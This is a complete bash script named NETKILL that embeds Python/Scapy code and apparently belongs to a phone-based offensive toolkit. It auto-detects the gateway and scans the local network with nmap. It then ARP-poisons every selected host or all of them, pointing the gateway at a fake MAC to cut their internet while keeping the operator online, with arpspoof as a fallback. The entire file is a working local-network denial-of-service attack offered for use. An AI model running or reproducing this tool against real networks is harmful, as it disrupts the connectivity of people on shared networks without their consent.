#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "NETKILL" "ARP gateway poison — cuts internet for others · phone stays online"

require_tool ip   "apt install iproute2"
require_tool nmap "apt install nmap"

outdir="$(make_outdir)"
outfile="$outdir/netkill.txt"
: > "$outfile"

# ── Pipeline: skip (requires interactive target selection) ────────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  printf '  %s[CHAIN]%s NetKill requires interactive target selection — skipping in pipeline%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  mark_done "$outfile"
  exit 0
fi

# ── Interface selection ────────────────────────────────────────────────────────
section "INTERFACE"

mapfile -t _ifaces < <(ip -o link show 2>/dev/null \
  | awk '$2!~/^(lo|p2p|dummy):/{gsub(/:$/,"",$2); print $2}')

if [[ ${#_ifaces[@]} -eq 0 ]]; then
  printf '  %s[!]%s No usable interfaces found%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi

for i in "${!_ifaces[@]}"; do
  printf '  %s[%02d]%s  %s\n' "${CYAN}" "$((i+1))" "${RESET}" "${_ifaces[$i]}"
done

printf '\n  %s>>%s Interface [1-%d]: ' "${CYAN}" "${RESET}" "${#_ifaces[@]}"
read -r _sel; _sel="${_sel:-1}"
if ! [[ "$_sel" =~ ^[0-9]+$ ]] || (( _sel < 1 || _sel > ${#_ifaces[@]} )); then
  printf '  %s[!]%s Invalid selection%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi
IFACE="${_ifaces[$((_sel-1))]}"

# ── Network info ───────────────────────────────────────────────────────────────
section "NETWORK INFO"

MY_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
MY_MAC=$(ip link show "$IFACE" 2>/dev/null | awk '/ether/{print $2}')
CIDR=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet )\S+' | head -1)

# Gateway detection — four methods, most reliable first
# Method 1: /proc/net/route — kernel routing table, works in any namespace/chroot
GW_IP=""
_gw_hex=$(awk -v dev="$IFACE" \
  '$1==dev && $2=="00000000" {print $3; exit}' /proc/net/route 2>/dev/null)
if [[ ${#_gw_hex} -eq 8 ]]; then
  GW_IP=$(printf '%d.%d.%d.%d' \
    "0x${_gw_hex:6:2}" "0x${_gw_hex:4:2}" \
    "0x${_gw_hex:2:2}" "0x${_gw_hex:0:2}")
fi

# Method 2: ip route show dev $IFACE
if [[ -z "$GW_IP" ]]; then
  GW_IP=$(ip route show dev "$IFACE" 2>/dev/null | awk '/^default/{print $3; exit}')
fi

# Method 3: ip route get (follows actual routing)
if [[ -z "$GW_IP" ]]; then
  GW_IP=$(ip route get 1.1.1.1 2>/dev/null \
    | awk '/via/{for(i=1;i<=NF;i++) if($i=="via"){print $(i+1); exit}}')
fi

# Method 4: full default route table
if [[ -z "$GW_IP" ]]; then
  GW_IP=$(ip -4 route 2>/dev/null | awk '/^default/{print $3; exit}')
fi

if [[ -z "$MY_IP" || -z "$GW_IP" ]]; then
  printf '  %s[!]%s No IP/gateway on %s — connect to a network first%s\n' \
    "${RED}" "${RESET}" "$IFACE" "${RESET}"; exit 1
fi

# Resolve real gateway MAC — ping first to populate ARP cache
ping -c 2 -W 1 -I "$IFACE" "$GW_IP" &>/dev/null || true
GW_MAC=$(ip neigh show "$GW_IP" 2>/dev/null \
  | awk '/lladdr/{print $5; exit}')
[[ -z "$GW_MAC" || "$GW_MAC" =~ ^(FAILED|INCOMPLETE|PROBE|STALE|NOARP)$ ]] && GW_MAC=""
# Fallback: arping
if [[ -z "$GW_MAC" ]] && command -v arping &>/dev/null; then
  GW_MAC=$(arping -c 2 -I "$IFACE" "$GW_IP" 2>/dev/null \
    | grep -oP '(?<=\[)[0-9A-Fa-f:]{17}(?=\])' | head -1)
fi

# Null MAC — no device on any network has this address
FAKE_MAC="de:ad:be:ef:00:00"

printf '  %s[SYS]%s Interface   : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
printf '  %s[SYS]%s Our IP      : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$MY_IP" "${RESET}"
printf '  %s[SYS]%s Our MAC     : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$MY_MAC" "${RESET}"
printf '  %s[SYS]%s Gateway     : %s  MAC: %s%s\n' \
  "${CYAN}" "${RESET}" "$GW_IP" "${GW_MAC:-unknown}" "${RESET}"
printf '  %s[SYS]%s Null MAC    : %s%s%s  ← victims pointed here\n\n' \
  "${CYAN}" "${RESET}" "${RED}" "$FAKE_MAC" "${RESET}"

# ── Host discovery ─────────────────────────────────────────────────────────────
section "DISCOVERING HOSTS"

printf '  %s[*]%s Scanning %s...%s\n\n' "${CYAN}" "${RESET}" "$CIDR" "${RESET}"

mapfile -t _all < <(nmap -sn -T4 --max-retries 2 "$CIDR" 2>/dev/null \
  | grep "Nmap scan report" | awk '{print $NF}' | tr -d '()')

declare -a VICTIMS=()
for _h in "${_all[@]}"; do
  [[ "$_h" == "$MY_IP" || "$_h" == "$GW_IP" ]] && continue
  VICTIMS+=("$_h")
  printf '  %s[+]%s %s\n' "${GREEN}" "${RESET}" "$_h"
done

if [[ ${#VICTIMS[@]} -eq 0 ]]; then
  printf '  %s[!]%s No other hosts found — nothing to kill%s\n' \
    "${YELLOW}" "${RESET}" "${RESET}"; exit 0
fi

printf '\n  %s[*]%s %d host(s) found%s\n' "${CYAN}" "${RESET}" "${#VICTIMS[@]}" "${RESET}"

# ── Target selection ───────────────────────────────────────────────────────────
section "TARGET SELECTION"

printf '  %s[01]%s ▶  Kill ALL hosts        %s(%d found)%s\n' \
  "${RED}" "${RESET}" "${DIM}" "${#VICTIMS[@]}" "${RESET}"
printf '  %s[02]%s ▶  Kill SELECTED hosts\n' "${CYAN}" "${RESET}"
printf '  %s[03]%s ▶  Kill CUSTOM IP(s)     %s(enter manually)%s\n\n' \
  "${DIM}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s>>%s Mode [1]: ' "${CYAN}" "${RESET}"
read -r _mode; _mode="${_mode:-1}"

case "$_mode" in
  2)
    printf '\n'
    for i in "${!VICTIMS[@]}"; do
      printf '  %s[%02d]%s  %s\n' "${CYAN}" "$((i+1))" "${RESET}" "${VICTIMS[$i]}"
    done
    printf '\n  %s>>%s Select hosts (e.g. 1 3 5): ' "${CYAN}" "${RESET}"
    read -r _picks
    declare -a _sel_victims=()
    for _p in $_picks; do
      [[ "$_p" =~ ^[0-9]+$ ]] && (( _p >= 1 && _p <= ${#VICTIMS[@]} )) \
        && _sel_victims+=("${VICTIMS[$((_p-1))]}")
    done
    VICTIMS=("${_sel_victims[@]}")
    ;;
  3)
    printf '  %s>>%s IP(s) to kill (space-separated): ' "${CYAN}" "${RESET}"
    read -r _custom
    IFS=' ' read -ra VICTIMS <<< "$_custom"
    ;;
esac

if [[ ${#VICTIMS[@]} -eq 0 ]]; then
  printf '  %s[!]%s No targets selected%s\n' "${YELLOW}" "${RESET}" "${RESET}"; exit 0
fi

printf '\n  %s[*]%s Targeting %d host(s): %s%s%s\n' \
  "${CYAN}" "${RESET}" "${#VICTIMS[@]}" "${BOLD}" "${VICTIMS[*]}" "${RESET}"

# ── Check for Scapy or arpspoof ────────────────────────────────────────────────
if ! python3 -c "import scapy" 2>/dev/null && ! command -v arpspoof &>/dev/null; then
  printf '\n  %s[!]%s No ARP tool found. Install one:%s\n' "${RED}" "${RESET}" "${RESET}"
  printf '       pip install scapy\n'
  printf '       apt install dsniff\n'
  exit 1
fi

# ── ARP restore on exit ────────────────────────────────────────────────────────
_ATTACK_PID=""
_restore_arp() {
  [[ -n "$_ATTACK_PID" ]] && kill "$_ATTACK_PID" 2>/dev/null || true
  printf '\n\n  %s[*]%s Restoring ARP cache...%s\n' "${CYAN}" "${RESET}" "${RESET}"
  if [[ -n "$GW_MAC" ]]; then
    python3 - "${VICTIMS[@]}" << PYEOF 2>/dev/null || true
import sys
from scapy.all import ARP, Ether, sendp
gw_ip="$GW_IP"; gw_mac="$GW_MAC"; iface="$IFACE"
victims = sys.argv[1:]
pkts = [Ether(dst='ff:ff:ff:ff:ff:ff') /
        ARP(op=2, psrc=gw_ip, hwsrc=gw_mac, pdst=v, hwdst='ff:ff:ff:ff:ff:ff')
        for v in victims]
if pkts:
    sendp(pkts, iface=iface, count=5, verbose=0)
PYEOF
  fi
  printf '  %s[+]%s Network restored — victims can reach internet again.%s\n' \
    "${GREEN}" "${RESET}" "${RESET}"
  echo "Stopped: $(date -Iseconds)" >> "$outfile"
  mark_done "$outfile"
  printf '\n  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
}
trap '_restore_arp; exit 0' INT TERM

# ── Log session start ──────────────────────────────────────────────────────────
{
  printf '=== NETKILL SESSION ===\n'
  printf 'Started : %s\n' "$(date -Iseconds)"
  printf 'Interface: %s\n' "$IFACE"
  printf 'Gateway : %s  (real MAC: %s)\n' "$GW_IP" "${GW_MAC:-unknown}"
  printf 'Null MAC: %s\n' "$FAKE_MAC"
  printf 'Targets :\n'
  printf '  %s\n' "${VICTIMS[@]}"
  printf '\n'
} >> "$outfile"

# ── Attack ─────────────────────────────────────────────────────────────────────
section "NETKILL ACTIVE"
printf '  %s[!]%s ARP poison: %s → %s%s%s (dead end)\n' \
  "${RED}" "${RESET}" "$GW_IP" "${BOLD}" "$FAKE_MAC" "${RESET}"
printf '  %s[!]%s Targets  : %s%s%s\n' \
  "${RED}" "${RESET}" "${BOLD}" "${VICTIMS[*]}" "${RESET}"
printf '  %s[!]%s Phone stays online — only victims lose internet.\n' "${GREEN}" "${RESET}"
printf '  %s[*]%s Ctrl+C to stop and restore network.\n\n' "${YELLOW}" "${RESET}"

if python3 -c "import scapy" 2>/dev/null; then
  # ── Scapy: send ARP replies with fake gateway MAC every 2 s ────────────────
  printf '  %s[*]%s Engine: scapy%s\n\n' "${DIM}" "${RESET}" "${RESET}"

  run_fg python3 - "${VICTIMS[@]}" << PYEOF
import sys, time, signal
from scapy.all import ARP, Ether, sendp

GW_IP  = "$GW_IP"
FAKE   = "$FAKE_MAC"
IFACE  = "$IFACE"
victims = sys.argv[1:]

GREEN = '\033[38;5;47m'; RED = '\033[38;5;196m'
CYAN  = '\033[38;5;51m'; DIM = '\033[2m'; BOLD = '\033[1m'; RESET = '\033[0m'

def poison():
    pkts = [
        Ether(dst='ff:ff:ff:ff:ff:ff') /
        ARP(op=2, psrc=GW_IP, hwsrc=FAKE, pdst=v, hwdst='ff:ff:ff:ff:ff:ff')
        for v in victims
    ]
    sendp(pkts, iface=IFACE, verbose=0)

cycle = 0
try:
    while True:
        poison()
        cycle += 1
        line = (f'  {RED}[KILL]{RESET} cycle {BOLD}{cycle:>4}{RESET}'
                f'  |  {BOLD}{len(victims)}{RESET} hosts poisoned'
                f'  |  gateway {CYAN}{GW_IP}{RESET} → {RED}{FAKE}{RESET}  ')
        print(f'\r{line}', end='', flush=True)
        time.sleep(2)
except (KeyboardInterrupt, SystemExit):
    pass
print()
PYEOF

else
  # ── arpspoof fallback (dsniff) ─────────────────────────────────────────────
  printf '  %s[*]%s Engine: arpspoof (dsniff)%s\n' "${DIM}" "${RESET}" "${RESET}"
  printf '  %s[!]%s Traffic will be routed via phone — IP forwarding stays OFF.%s\n\n' \
    "${YELLOW}" "${RESET}" "${RESET}"
  echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

  declare -a _SPOOF_PIDS=()
  for _v in "${VICTIMS[@]}"; do
    arpspoof -i "$IFACE" -t "$_v" "$GW_IP" &>/dev/null &
    _SPOOF_PIDS+=("$!")
  done
  _ATTACK_PID="${_SPOOF_PIDS[0]:-}"

  _cycle=0
  while true; do
    (( _cycle++ ))
    printf '\r  %s[KILL]%s cycle %4d  |  %d hosts poisoned via arpspoof  ' \
      "${RED}" "${RESET}" "$_cycle" "${#VICTIMS[@]}"
    sleep 5
  done
fi
